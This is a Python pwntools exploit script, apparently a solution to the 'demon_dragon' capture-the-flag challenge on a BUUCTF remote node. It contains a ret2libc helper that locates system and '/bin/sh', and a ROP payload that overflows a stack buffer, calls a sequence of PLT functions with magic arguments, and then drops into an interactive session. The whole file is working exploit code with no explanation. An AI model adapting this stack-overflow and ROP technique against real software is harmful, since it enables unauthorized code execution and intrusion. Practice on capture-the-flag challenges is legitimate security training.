from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './demon_dragon'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 28363) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
ru('with ')
elem = [ru(', ') for i in range(4)]
elem.append(ru('!\n'))

pop_rdi = 0x400e43 # 1
pop_rsi = 0x400e41 # 2
pop3 = 0x400c3a # 1,2,3

strategy = {
	'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']),
	'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']),
	'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']),
	'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']),
	'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield'])
}

payload = 'a'*0x48
for attack in elem:
	payload += strategy[attack]

pos = 0x6020b0
payload += flat(pop_rdi,pos,elf.plt['check'])
sla('Skill > ',payload)
# end

itr()